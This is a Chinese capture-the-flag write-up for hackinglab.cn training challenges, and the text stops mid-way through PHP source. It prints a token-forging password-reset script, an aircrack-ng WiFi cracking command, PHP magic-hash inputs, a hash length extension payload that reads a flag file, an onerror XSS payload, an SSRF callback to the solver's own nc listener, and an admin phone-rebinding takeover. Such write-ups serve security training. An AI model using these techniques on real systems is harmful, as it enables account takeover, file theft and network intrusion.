<p>解出来是一个<code>时间戳</code>，转为北京时间是<code>2018/7/19 14:5:54</code></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/15833912.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>就是我刚刚提交的时间，所以思路大概就是将上传的时间转为<code>Unix时间戳</code>，然后<code>md5</code>加密，<br>将<code>sukey</code>和<code>username</code>分别等于<code>md5加密后的时间戳</code>和<code>admin</code>提交，<br>并且响应包得到的时间是比实际时间少的，</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/15606099.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>这里给出两种做法</p>
<ul>
<li>第一种是手动将响应包里的时间手动转为<code>Unix时间戳</code></li>
<li>第二种是用脚本获取响应包的时间</li>
</ul>
<p>第一种：</p>
<p>先提交<code>username</code>为<code>admin</code>，然后记录下<code>响应头</code>的<code>date</code></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23317299.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>然后去<a href="http://tool.chinaz.com/Tools/unixtime.aspx" target="_blank" rel="noopener">在线网站</a>转为时间戳,<br>记住小时需要跟北京时间一样，其他都一样</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/70214163.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>将<code>sukey</code>等于<code>时间戳md5加密后的值</code>访问即可，</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/34392445.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/97004605.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>得到key</p>
<p>第二种是用python，但是<code>time()</code>函数得到的当前时间戳与上传时的对不上，<br>所以只能与手动的方法一样，从响应头里获取时间。<br>附上脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests,hashlib,time,re</span><br><span class="line"></span><br><span class="line">def month(month):</span><br><span class="line">	months = [&quot;Jua&quot;,&quot;Feb&quot;,&quot;Mar&quot;,&quot;Apr&quot;,&quot;May&quot;,&quot;Jun&quot;,&quot;Jul&quot;,&quot;Aug&quot;,&quot;Sep&quot;,&quot;Oct&quot;,&quot;Nov&quot;,&quot;Dec&quot;]</span><br><span class="line">	for a in range(0,len(months)):</span><br><span class="line">		if months[a] == month:</span><br><span class="line">			return a+1</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">url = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/resetpassword.php&apos;</span><br><span class="line">post = &#123;&apos;username&apos;:&apos;admin&apos;&#125;</span><br><span class="line">a = r.post(url,data = post)</span><br><span class="line">list = re.compile(r&apos;[\,\s\:]+&apos;).split(a.headers[&apos;date&apos;])</span><br><span class="line">ct = (list[3]+&apos;-&apos;+str(month(list[2]))+&apos;-&apos;+list[1]+&apos; &apos;+str(int(list[4])+8)+&apos;:&apos;+list[5]+&apos;:&apos;+list[6])</span><br><span class="line">sukey = hashlib.new(&apos;md5&apos;,str(int(time.mktime(time.strptime(ct,&apos;%Y-%m-%d %H:%M:%S&apos;)))).encode(encoding=&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">url2 = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=&apos;+sukey+&apos;&amp;username=admin&apos;</span><br><span class="line">print(r.get(url2).text)</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/92437870.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="邂逅对门的妹纸"><a href="#邂逅对门的妹纸" class="headerlink" title="邂逅对门的妹纸"></a>邂逅对门的妹纸</h4><p>这题给的是一个<code>wifi的握手包</code>，kali中有专门的工具来破解握手包<code>aircrack</code>，<br>但是需要字典，给了<code>年级和年份</code>，估计密码就是生日了，<br>先从网上下载一个生日字典，也可以自己生成<br>使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng wifi-crack.cap -w pass.txt</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/9407114.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>得到生日密码之后按照题目要求加密提交即可</p>
<h4 id="万恶的Cisco"><a href="#万恶的Cisco" class="headerlink" title="万恶的Cisco"></a>万恶的Cisco</h4><p>直接<code>GoogleCisco破解</code>,<a href="http://www.toolsxx.com/code/cisco.php" target="_blank" rel="noopener">Cisco思科密码在线解密</a></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/72556291.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="万恶的加密"><a href="#万恶的加密" class="headerlink" title="万恶的加密"></a>万恶的加密</h4><p>huawei交换机的加密方式，有人写过<a href="https://github.com/grutz/h3c-pt-tools" target="_blank" rel="noopener">python工具</a><br>使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python27 hh3c_cipher.py -c &quot;aK9Q4I)J&apos;#[Q=^Q`MAF4&lt;1!!&quot;</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/54131428.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="喜欢泡网吧的小明"><a href="#喜欢泡网吧的小明" class="headerlink" title="喜欢泡网吧的小明"></a>喜欢泡网吧的小明</h4><p>给的是一个<code>dump</code>文件，里头的内容有些看不懂，看了网上的wp才知道做的，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先将当下的数据不做改动，进行刷卡，显示卡片异常。说明，卡片的头信息错误。一般的卡片的头信息应该是前8~16个字节。头信息应该有个开始和结束标准信息。</span><br></pre></td></tr></table></figure></p>
<p>直接将文件上传的话会显示<code>卡片异常</code>，并且题目提示了有一个字节产生了错误。</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23883661.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>网上给的wp是将开头的<code>AA</code>变为<code>8A</code>, 原因是头部信息错误所以读取失败，具体为什么改为<code>8A</code>也不清楚，<br>但是改为<code>8A</code>后，提示:</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/95794273.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>可以正常刷卡了，但是余额为100，往下看文件内容，有<code>1027</code>，转为10进制是<code>4135</code>，没有啥关系，<br>但是这些卡的加密方式是有可能倒叙的，所以再试试<code>2710</code>，可以发现刚好是<code>10000</code>，对应的是100.00，所以我们现在只需要将<code>20000</code>转为16进制，然后倒序即可,将两个<code>1027</code>的值改为<code>204E</code>，保存再上传即可</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/99847806.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="异常数据"><a href="#异常数据" class="headerlink" title="异常数据"></a>异常数据</h4><p>题目给出一段加密后的字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AGV5IULSB3ZLVSE=</span><br></pre></td></tr></table></figure></p>
<p>数字和字母，估计是base32，但是base32解不出，所以大概率是base64，只是把其中的小写字母换成了大写，<br>base64是3位为一组，加密成4个字节，所以分成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AGV5</span><br><span class="line">IULS</span><br><span class="line">B3ZL</span><br><span class="line">VSE=</span><br></pre></td></tr></table></figure></p>
<p>首先看看第一次解密:</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/50682055.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>出了乱码，所以将A改为小写</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/34427238.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>可以发现思路就是这样，<code>hey</code>已经出来了，所以可以进行下一组，重复这个步骤即可</p>
<p>最终为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aGV5</span><br><span class="line">IUls</span><br><span class="line">b3Zl</span><br><span class="line">VSE=</span><br></pre></td></tr></table></figure>
<p><a href="http://www.qqxiuzi.cn/bianma/base64.htm" target="_blank" rel="noopener">解码链接</a></p>
<h4 id="md5真的能碰撞嘛"><a href="#md5真的能碰撞嘛" class="headerlink" title="md5真的能碰撞嘛?"></a>md5真的能碰撞嘛?</h4><p>题目点击<code>__</code>后，可以直接看到源码，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=FLAG;</span><br><span class="line">if(isset($_POST[&quot;password&quot;]))&#123;</span><br><span class="line">	$password=$_POST[&apos;password&apos;];</span><br><span class="line">    $rootadmin=&quot;!1793422703!&quot;;</span><br><span class="line">    if($password==$rootadmin)&#123;die(&quot;Please do not attack admin account!&quot;);&#125;</span><br><span class="line">    </span><br><span class="line">    if(md5($password)==md5($rootadmin))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;Password Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>大概意思就是<code>$rootadmin</code>的md5要跟上传上去的值的md5一样，而且本身的值也不能一样<br>先看看<code>!1793422703!</code>的md5是多少,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e332932043729729062996282883873</span><br></pre></td></tr></table></figure></p>
<p>0e后面全是数字，php弱类型，POST<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=240610708或者QNKCDZO</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/89887581.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>拿到key</p>
<h4 id="小明爱上了一个搞硬件的小姑凉"><a href="#小明爱上了一个搞硬件的小姑凉" class="headerlink" title="小明爱上了一个搞硬件的小姑凉"></a>小明爱上了一个搞硬件的小姑凉</h4><p>题目给的是一个<code>logicdata</code>文件，提示是一个逻辑分析仪抓包数据，<br>winhex打开之后，在文件的最后有一串英文，</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/5595813.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>搜一搜<code>saleae</code>,发现需要下载这个公司的软件才能解密<br><a href="https://www.saleae.com/zh/downloads/" target="_blank" rel="noopener">下载链接</a><br>下载完用这个号软件打开之后即可看到答案，英文不好的同学注意，<code>COMMA</code>是逗号的意思</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/73840994.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="有签名限制的读取任意文件"><a href="#有签名限制的读取任意文件" class="headerlink" title="有签名限制的读取任意文件"></a>有签名限制的读取任意文件</h4><p>右键查看源代码可以看到部分代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">include &quot;_flag.php&quot;;</span><br><span class="line">include &quot;salt.php&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mysalt=SALT;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;filepath&apos;])&amp;&amp;!empty($_GET[&apos;filepath&apos;]) &amp;&amp;isset($_GET[&apos;sign&apos;]) &amp;&amp;!empty($_GET[&apos;sign&apos;]))&#123;</span><br><span class="line">	myreadfile($_GET[&apos;filepath&apos;],$mysalt,$_GET[&apos;sign&apos;]);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	//降低一点复杂度</span><br><span class="line">	var_dump(strlen($mysalt));</span><br><span class="line">	testsign(&quot;/etc/hosts&quot;,$mysalt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function myhash($message,$mysalt)&#123;</span><br><span class="line">		return md5($mysalt.$message);</span><br><span class="line">&#125;</span><br><span class="line">function checksign($message,$mysalt,$sign)&#123;</span><br><span class="line">    if($sign==myhash($message,$mysalt))&#123;</span><br><span class="line">    	return True;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    	return False;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function myreadfile($filepath,$mysalt,$sign)&#123;</span><br><span class="line">	$res=checksign($filepath,$mysalt,$sign);</span><br><span class="line">    if($res)&#123;</span><br><span class="line">    	echo getfile($filepath);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">    	echo &apos;sign error!&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function testsign($filepath,$mysalt)&#123;</span><br><span class="line">	echo myhash($filepath,$mysalt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;&lt;!--&quot;.file_get_contents(__FILE__);</span><br></pre></td></tr></table></figure>
<p>题目已经给出提示<code>MD5 Length Extension Attack!</code>，md5长度扩展攻击，<br>先看看代码，可以知道的是已知<code>md5</code>，已知<code>salt的长度</code>，还知道<code>/etc/hosts</code>,<br>这里给出<a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">工具下载链接</a><br>使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump -h</span><br><span class="line">HashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]</span><br><span class="line">    HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.</span><br><span class="line">    -h --help          Display this message.</span><br><span class="line">    -t --test          Run tests to verify each algorithm is operating properly.</span><br><span class="line">    -s --signature     The signature from known message.</span><br><span class="line">    -d --data          The data from the known message.</span><br><span class="line">    -a --additional    The information you would like to add to the known message.</span><br><span class="line">    -k --keylength     The length in bytes of the key being used to sign the original message with.</span><br><span class="line">    Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.</span><br><span class="line">    &lt;Developed by bwall(@botnet_hunter)&gt;</span><br></pre></td></tr></table></figure></p>
<p>安装方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p>
<p>这里我们知道的是<code>signature</code>、<code>data</code>、<code>keylength</code>,需要读取的文件这里写成<code>_flag.php</code><br>所以工具使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s f3d366138601b5afefbd4fc15731692e -d /etc/hosts -k 32 -a /etc/_flag.php</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/41625045.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>提交时需要把<code>\x</code>换成<code>%</code>，因为是URL编码的<br>最终的payload是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/decrypt1_53a52adb49c55c8daa5c8ee0ff59befe/md5_le.php?filepath=/etc/hosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00/etc/_flag.php&amp;sign=7fbbac6efeb7939be04829bc9a847f0c</span><br></pre></td></tr></table></figure></p>
<h4 id="美丽的邂逅与密码器的开门密码"><a href="#美丽的邂逅与密码器的开门密码" class="headerlink" title="美丽的邂逅与密码器的开门密码"></a>美丽的邂逅与密码器的开门密码</h4><p>这题题目给的一个exe文件，名字还是<code>reverse</code>,逆向题，IDA打开之后找到主函数</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/25904383.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>可以看到当<code>v19</code>等于<code>1</code>的时候才会输出一段字符，找到<code>401005</code>函数，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_401005(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  return sub_401020(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>又跳到了<code>401020</code>,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BOOL __cdecl sub_401020(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v2; // [sp+Ch] [bp-44h]@1</span><br><span class="line">  int v3; // [sp+4Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  memset(&amp;v2, 0xCCu, 0x44u);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  v3 = strlen(a1);</span><br><span class="line">  return v3 &gt; 50;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看出来当<code>v20</code>的长度大于<code>50</code>就能返回<code>true</code>，也就是<code>1</code><br>运行程序，输入任意字符，长度大于50:</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/66247550.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>得到key</p>
<h3 id="综合关"><a href="#综合关" class="headerlink" title="综合关"></a>综合关</h3><h4 id="渗透测试第一期"><a href="#渗透测试第一期" class="headerlink" title="渗透测试第一期"></a>渗透测试第一期</h4><p>这题先把每个页面<code>POST</code>的变量抓个包看看，<br>在尝试了几次之后，发现几个问题</p>
<ul>
<li>注册时用户名不能使用<code>admin</code></li>
<li>在绑定手机页面出现了<code>username</code>这个变量</li>
<li>绑不绑定手机效果都一样</li>
<li>在忘记密码页面，需要跟用户名与之绑定的手机号才能得到验证码</li>
</ul>
<p>这题就有了大概的思路，需要登录进<code>admin</code>账户，但是不知道密码，<br>爆破试了之后发现不少弱口令，所以需要<code>重置密码</code>，<code>重置密码</code>时需要<code>手机号</code>，<br>但是当将<code>username</code>等于<code>admin</code>之后，发现:</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/35560040.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>所以需要将<code>admin</code>用户的手机号绑定为已知的手机号，刚好在绑定手机页面<code>username</code>可以更改，</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/18276112.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>回到<code>忘记密码</code>页面，Username填写<code>admin</code>，正常发送即可重置密码</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/74060841.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>再用重置的密码登陆即可得到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/4310267.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="没有注入到底能不能绕过登录"><a href="#没有注入到底能不能绕过登录" class="headerlink" title="没有注入到底能不能绕过登录"></a>没有注入到底能不能绕过登录</h4><p>首先题目提示了不是SQL注入，并且题目里没有什么有用的提示，<br>所以只能先扫一下后台，发现<code>robots.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /myadminroot/</span><br></pre></td></tr></table></figure>
<p>访问一下<code>myadminroot</code>，但是提示<code>Please login first!</code><br>所以现在找办法登陆，但是我用burpsuite抓包时发现，<br>在登陆页面<code>go</code>一次之后，在其他页面访问<code>myadminroot</code>就能得到<code>key</code><br>所以发现了在弹出<code>error</code>时，不点击确认就不会将已经登陆的状态取消，<br>估计就是<code>session</code>的原因，直接得到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/32440387.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="美图闪亮亮交友平台"><a href="#美图闪亮亮交友平台" class="headerlink" title="美图闪亮亮交友平台"></a>美图闪亮亮交友平台</h4><p>题目直接给了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tips: 邮箱没有xss漏洞</span><br><span class="line">Tips: 管理员用的是手机wap邮箱,而且管理员的手机不支持Cookie(20150823)</span><br></pre></td></tr></table></figure></p>
<p>邮箱没有XSS，但是在题目中的<code>input</code>框中还是存在XSS，管理员也没有cookie，<br>所以没办法使用<code>管理员的cookie</code>登陆进后台，<br>在网上找了也没有writeup，最终看到了<a href="http://www.dianyue.me/archives/743/jgm7qbcmkh94wam6/" target="_blank" rel="noopener">出题人给的提示</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目采用curl模拟方式来模拟管理员审核的过程。</span><br></pre></td></tr></table></figure></p>
<p>估计是<code>SSRF</code><br>先说下解题思路，在<code>姓名</code>和<code>照片描述</code>处都没有做要求，但是在<code>图片URL</code>处对内容做了要求，<br>必须是网址，但是抓包发送的话可以<code>绕过js</code>，</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/85558377.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>并且在<code>&lt;img&gt;</code>处没有过滤，可以正常弹窗，代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.hackinglab.cn/meitu.jpg11&quot; onerror=&quot;alert(1)</span><br></pre></td></tr></table></figure></p>
<p>一开始看起来像<code>存储型XSS</code>但是题目给了提示，并不是XSS<br>所以只能换一种思路，在看了出题人给的提示之后，看到了<code>curl</code></p>
<p>SSRF 漏洞出现的场景：</p>
<ul>
<li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li>
<li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li>
<li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li>
<li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li>
<li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li>
</ul>
<p>猜测是管理员用<code>curl</code>命令访问了<code>图片URL</code>,<br>这里采用<code>nc</code>来获取信息:<br>服务器端，监听一个端口（确保这个端口是开着的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8888</span><br></pre></td></tr></table></figure></p>
<p>图片URL:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://你的服务器IP:8888</span><br></pre></td></tr></table></figure></p>
<p>再发送即可，</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/57813388.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>此时在自己的服务器上可以看到一个请求</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/97865878.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>访问这个URL即可得到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-21/31563770.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="最简单的数字取证1"><a href="#最简单的数字取证1" class="headerlink" title="最简单的数字取证1"></a>最简单的数字取证1</h4><p>这题可以直接用软件<code>DiskGenius</code>，网上一搜一大把，是一个用来分区的软件，<br>打开软件，在上方的<code>磁盘</code>-&gt;<code>打开虚拟磁盘文件</code>-&gt;选择下载下来的文件即可,之后打开磁盘可以直接看到key</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/35196034.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="最简单的数字取证2"><a href="#最简单的数字取证2" class="headerlink" title="最简单的数字取证2"></a>最简单的数字取证2</h4><p>方法与上题一样，不过key文件在<code>RECYLER</code>里的一个文件中的<code>De1.txt</code>里</p>
<h4 id="小明学习代码审计"><a href="#小明学习代码审计" class="headerlink" title="小明学习代码审计"></a>小明学习代码审计</h4><p>一个代码审计题，打开题目查看源代码可以发现一个<code>resetpwd.php</code>的页面，打开之后是一个提交的input框，<br>右键查看源代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">session_start();</span><br><span class="line">include &apos;_flag.php&apos;;</span><br><span class="line">date_default_timezone_set(&apos;Asia/Shanghai&apos;);</span><br><span class="line">if(isset($_POST[&apos;token&apos;]) &amp;&amp; isset($_SESSION[&apos;token&apos;]) &amp;&amp;!empty($_POST[&apos;token&apos;])&amp;&amp;!empty($_SESSION[&apos;token&apos;]))&#123;</span><br><span class="line">    if($_POST[&apos;token&apos;]==$_SESSION[&apos;token&apos;])&#123;</span><br><span class="line">        echo &quot;PassResetSuccess! Your Flag is:&quot;.$flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    	echo &quot;Token_error!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    mt_srand(time());</span><br><span class="line">    $rand= mt_rand();</span><br><span class="line">    $_SESSION[&apos;token&apos;]=sha1(md5($rand));</span><br><span class="line">    echo &quot;Token Generate Ok! now send email to your EmailBox!.....&quot;;</span><br><span class="line">    if(sendmymail($_SESSION[&apos;token&apos;]))&#123;</span><br><span class="line">    	echo &quot;SendOK! \r\n&lt;br&gt; Your password reset Token has been send to your mailbox! &lt;br&gt;Please Check your mail box and fill your token here to reset your password!&lt;br&gt;&quot;;</span><br><span class="line">    